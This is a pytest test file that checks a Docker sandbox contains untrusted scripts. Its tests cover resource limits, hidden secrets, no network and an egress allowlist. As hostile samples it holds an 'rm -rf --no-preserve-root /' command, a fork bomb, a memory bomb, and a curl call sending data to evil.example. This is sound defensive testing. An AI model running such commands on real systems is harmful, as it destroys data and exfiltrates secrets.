"""Hostile payloads stay inside a throwaway container. The host is left alone."""

from __future__ import annotations

import os
import subprocess
import textwrap
from pathlib import Path

import pytest

from sandbox.jobs import run_script
from sandbox.runner import SandboxSpec, create_network, docker_ready, remove_network

ROOT = Path(__file__).resolve().parents[1]
pytestmark = pytest.mark.docker


@pytest.fixture(scope="module")
def images():
    if not docker_ready():
        pytest.skip("Docker is not available")
    subprocess.check_call(["docker", "build", "-t", "trustscout-code", str(ROOT / "sandbox" / "code")])
    subprocess.check_call(["docker", "build", "-t", "trustscout-egress", str(ROOT / "sandbox" / "egress")])


def _canary(tmp_path: Path) -> Path:
    path = tmp_path / "host-canary.txt"
    path.write_text("CANARY", encoding="utf-8")
    return path


def _run(script: str, tmp_path: Path, timeout: int, **kwargs):
    out = tmp_path / "out"
    return run_script(script=script, output_dir=out, host_output_dir=out, timeout_sec=timeout, **kwargs)


def test_limits_and_no_secret_env(images, tmp_path, monkeypatch):
    monkeypatch.setenv("VULTR_INFERENCE_API_KEY", "unit-test-placeholder")
    canary = _canary(tmp_path)
    result = _run("print('hello', flush=True)\n", tmp_path, 20).sandbox
    assert result.destroyed
    assert result.runtime in {"runc", "runsc"}
    assert result.host_config["ReadonlyRootfs"] is True
    assert result.host_config["Memory"] == 1024**3
    assert result.host_config["PidsLimit"] == 128
    assert result.host_config["NanoCpus"] == 1_000_000_000
    assert "ALL" in result.host_config["CapDrop"]
    assert any("no-new-privileges" in item for item in result.host_config["SecurityOpt"])
    assert result.host_config["NetworkMode"] == "none"
    assert not any(name.startswith("VULTR") for name in result.env_names)
    assert "unit-test-placeholder" not in result.logs
    assert canary.read_text(encoding="utf-8") == "CANARY"
    assert _gone(result.name)


def test_rm_rf_does_not_touch_the_host(images, tmp_path):
    canary = _canary(tmp_path)
    script = textwrap.dedent(
        """
        import os
        import subprocess
        print("STAGE rm", flush=True)
        done = subprocess.run(["rm", "-rf", "--no-preserve-root", "/"], capture_output=True, text=True)
        print("RM_RC", done.returncode, flush=True)
        print("ROOT_OK", os.path.exists("/usr/local/bin/python"), flush=True)
        """
    )
    outcome = _run(script, tmp_path, 30)
    assert "ROOT_OK True" in outcome.logs
    assert "RM_RC 1" in outcome.logs
    assert canary.read_text(encoding="utf-8") == "CANARY"
    assert Path("/usr/bin/python3").exists()
    assert outcome.sandbox.destroyed
    assert _gone(outcome.sandbox.name)


def test_fork_bomb_hits_the_pids_limit(images, tmp_path):
    before = _proc_count()
    script = textwrap.dedent(
        """
        import os
        import time
        forks = 0
        try:
            while True:
                pid = os.fork()
                if pid == 0:
                    time.sleep(30)
                    os._exit(0)
                forks += 1
        except OSError as exc:
            print("FORK_BLOCKED", forks, exc.errno, flush=True)
        """
    )
    outcome = _run(script, tmp_path, 20)
    assert "FORK_BLOCKED" in outcome.logs
    assert outcome.sandbox.destroyed
    assert _gone(outcome.sandbox.name)
    assert _proc_count() - before < 40


def test_infinite_loop_is_killed(images, tmp_path):
    script = "print('STAGE loop', flush=True)\nwhile True:\n    pass\n"
    outcome = _run(script, tmp_path, 6)
    assert outcome.sandbox.timed_out
    assert outcome.sandbox.destroyed
    assert _gone(outcome.sandbox.name)


def test_memory_bomb_is_oom_killed(images, tmp_path):
    script = textwrap.dedent(
        """
        chunks = []
        while True:
            chunks.append(bytearray(8 * 1024 * 1024))
        """
    )
    outcome = _run(script, tmp_path, 25)
    assert outcome.sandbox.oom_killed or outcome.sandbox.exit_code == 137
    assert outcome.sandbox.destroyed
    assert _gone(outcome.sandbox.name)


def test_curl_exfil_has_no_network(images, tmp_path):
    script = textwrap.dedent(
        """
        import subprocess
        print("STAGE exfil", flush=True)
        done = subprocess.run(
            ["curl", "-m", "3", "-sS", "http://evil.example/collect"],
            capture_output=True,
            text=True,
        )
        print("CURL_RC", done.returncode, flush=True)
        """
    )
    outcome = _run(script, tmp_path, 20)
    assert "CURL_RC 0" not in outcome.logs.split("CURL_ERR")[0]
    assert "CURL_RC" in outcome.logs
    rc_line = next(line for line in outcome.logs.splitlines() if line.startswith("CURL_RC"))
    assert rc_line.strip() != "CURL_RC 0"
    assert outcome.sandbox.host_config["NetworkMode"] == "none"


def test_hostile_script_is_contained_then_a_fresh_container_runs(images, tmp_path):
    script = (ROOT / "mockmarket" / "payloads" / "hostile_price.py").read_text(encoding="utf-8")
    canary = _canary(tmp_path)
    first = _run(script, tmp_path / "hostile", 15)
    assert "RM_RC" in first.logs
    assert "CURL_RC" in first.logs
    assert "FORK_BLOCKED" in first.logs
    assert "STAGE loop" in first.logs
    assert first.sandbox.timed_out
    assert first.sandbox.destroyed
    assert not any(name.startswith("VULTR") for name in first.sandbox.env_names)
    assert canary.read_text(encoding="utf-8") == "CANARY"
    second = _run("print('fresh', flush=True)\n", tmp_path / "fresh", 20)
    assert second.sandbox.container_id
    assert second.sandbox.container_id != first.sandbox.container_id
    assert "fresh" in second.logs
    assert _gone(first.sandbox.name)
    assert _gone(second.sandbox.name)


def test_egress_allowlist(images, tmp_path):
    from sandbox.jobs import _start_proxy
    from sandbox.runner import remove_container

    outer = "ts-out-test"
    inner = "ts-in-test"
    remove_network(outer)
    remove_network(inner)
    create_network(outer, internal=False)
    create_network(inner, internal=True)
    server = tmp_path / "server.py"
    server.write_text(
        textwrap.dedent(
            """
            from http.server import BaseHTTPRequestHandler, HTTPServer

            class Handler(BaseHTTPRequestHandler):
                def do_GET(self):
                    body = b"ok-allowed"
                    self.send_response(200)
                    self.send_header("Content-Length", str(len(body)))
                    self.end_headers()
                    self.wfile.write(body)

                def log_message(self, fmt, *args):
                    return

            HTTPServer(("0.0.0.0", 8080), Handler).serve_forever()
            """
        ),
        encoding="utf-8",
    )
    _server("allowed", outer, server)
    _server("evil", outer, server)
    allow = tmp_path / "proxy"
    allow.mkdir()
    (allow / "allowlist.txt").write_text("allowed\n", encoding="utf-8")
    try:
        proxy_ip = _start_proxy(
            name="ts-proxy-test",
            image="trustscout-egress",
            allow_dir=allow,
            app_network=outer,
            sandbox_network=inner,
            allow_host="allowed",
        )
        client = textwrap.dedent(
            """
            import json
            from urllib.request import ProxyHandler, build_opener

            cfg = json.load(open("/out/task.json", encoding="utf-8"))
            opener = build_opener(ProxyHandler({"http": cfg["proxy"]}))

            def fetch(url):
                try:
                    with opener.open(url, timeout=5) as resp:
                        return str(resp.status), resp.read()[:40].decode()
                except Exception as exc:
                    return type(exc).__name__, str(exc)[:180]

            print("ALLOW", fetch(cfg["allow_url"]), flush=True)
            print("DENY", fetch(cfg["deny_url"]), flush=True)
            try:
                import urllib.request
                urllib.request.urlopen(cfg["deny_url"], timeout=3).read()
                print("DIRECT", "open", flush=True)
            except Exception as exc:
                print("DIRECT", type(exc).__name__, flush=True)
            """
        )
        out = tmp_path / "client"
        outcome = run_script(
            script=client,
            output_dir=out,
            host_output_dir=out,
            timeout_sec=25,
            network=inner,
            extra_files={
                "task.json": json_task(proxy_ip),
            },
        )
        assert "ALLOW" in outcome.logs and "200" in outcome.logs
        assert "ok-allowed" in outcome.logs
        deny = outcome.logs.split("DENY", 1)[1].split("DIRECT", 1)[0]
        assert "200" not in deny or "blocked" in deny or "403" in deny
        assert "DIRECT open" not in outcome.logs
    finally:
        remove_container("ts-proxy-test")
        remove_container("allowed")
        remove_container("evil")
        remove_network(inner)
        remove_network(outer)


def json_task(proxy_ip: str) -> str:
    import json

    return json.dumps(
        {
            "proxy": f"http://{proxy_ip}:8888",
            "allow_url": "http://allowed:8080/",
            "deny_url": "http://evil:8080/",
        }
    )


def _server(name: str, network: str, script: Path) -> None:
    subprocess.run(["docker", "rm", "-f", name], capture_output=True, check=False)
    proc = subprocess.run(
        [
            "docker",
            "run",
            "-d",
            "--name",
            name,
            "--network",
            network,
            "-v",
            f"{script}:/srv/server.py:ro",
            "python:3.12-slim",
            "python",
            "/srv/server.py",
        ],
        capture_output=True,
        text=True,
        check=False,
    )
    if proc.returncode != 0:
        raise RuntimeError(proc.stderr)


def _gone(name: str) -> bool:
    proc = subprocess.run(
        ["docker", "ps", "-aq", "--filter", f"name=^{name}$"],
        capture_output=True,
        text=True,
        check=False,
    )
    return proc.stdout.strip() == ""


def _proc_count() -> int:
    return len([name for name in os.listdir("/proc") if name.isdigit()])


def test_comps_script_writes_a_chart(images, tmp_path):
    from agent.comps import COMPS_SCRIPT
    from agent.stats import summarize

    out = tmp_path / "comps"
    outcome = run_script(
        script=COMPS_SCRIPT,
        output_dir=out,
        host_output_dir=out,
        timeout_sec=30,
        extra_files={
            "input.json": '{"title": "Oak writing desk", "price": 180, "comps": [250, 270, 286, 300, 320]}',
        },
    )
    assert outcome.ok, outcome.logs
    assert outcome.chart is not None and outcome.chart.stat().st_size > 1000
    expected = summarize(180, [250, 270, 286, 300, 320])
    assert outcome.result["median"] == expected["median"]
    assert outcome.result["pct_under"] == expected["pct_under"]
    assert outcome.sandbox.host_config["NetworkMode"] == "none"
    assert outcome.sandbox.destroyed


def test_run_spec_network_none_is_the_default(images, tmp_path):
    spec = SandboxSpec(image="trustscout-code", output_dir=tmp_path, timeout_sec=10)
    assert spec.network is None
